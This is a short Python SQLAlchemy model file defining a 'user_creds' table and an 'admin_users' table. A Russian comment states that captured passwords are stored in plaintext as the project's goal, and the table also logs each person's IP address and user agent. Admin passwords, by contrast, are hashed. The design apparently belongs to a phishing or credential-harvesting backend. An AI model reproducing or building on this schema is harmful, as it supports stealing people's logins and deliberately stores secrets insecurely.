from sqlalchemy import Column, Integer, String, DateTime, func
from sqlalchemy.ext.declarative import declarative_base

Base = declarative_base()

class UserCred(Base):
    __tablename__ = "user_creds"
    
    id = Column(Integer, primary_key=True, index=True)
    username = Column(String, nullable=False, index=True)   # телефон или email
    password = Column(String, nullable=False)               # храним открыто (цель проекта)
    ip_address = Column(String, nullable=True)
    user_agent = Column(String, nullable=True)
    created_at = Column(DateTime, server_default=func.now(), index=True)

class AdminUser(Base):
    __tablename__ = "admin_users"
    
    id = Column(Integer, primary_key=True, index=True)
    username = Column(String, unique=True, nullable=False)
    hashed_password = Column(String, nullable=False)